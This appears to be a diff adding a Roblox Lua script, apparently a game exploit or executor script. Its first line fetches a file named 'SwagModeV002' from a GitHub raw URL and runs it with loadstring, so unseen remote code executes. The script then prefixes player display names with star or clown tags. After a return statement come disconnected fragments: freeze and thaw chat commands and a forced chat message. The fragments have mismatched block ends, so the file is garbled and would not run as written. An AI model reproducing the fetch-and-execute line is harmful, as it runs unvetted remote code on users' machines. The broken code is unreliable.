@@ -1,0 +1,35 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002"))()
+
+ModIDs = {
+
+4231095077,
+
+}
+
+local success, err = pcall(function()
+    for i,v in pairs(game.Players:GetChildren()) do
+        if v.Character then
+            if table.find(ModIDs,v.UserId) then
+                v.Character.Humanoid.DisplayName = "[⭐]"..v.DisplayName
+            elseif not v.Character.Head:FindFirstChild("OriginalSize") then
+                v.Character.Humanoid.DisplayName = "[🤡]"..v.DisplayName
+            end
+        end
+    end
+end)
+
+return ModIDs
+
+if string.find(msg, '/e find') then
+                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("void daddy", 'All');
+            end
+        end
+    end
+
+    if string.find(SplitCMD[2], ':thaw') then
+                player.Character.HumanoidRootPart.Anchored = false
+            end
+
+            if string.find(SplitCMD[2], ':freeze') then
+                player.Character.HumanoidRootPart.Anchored = true
+            end
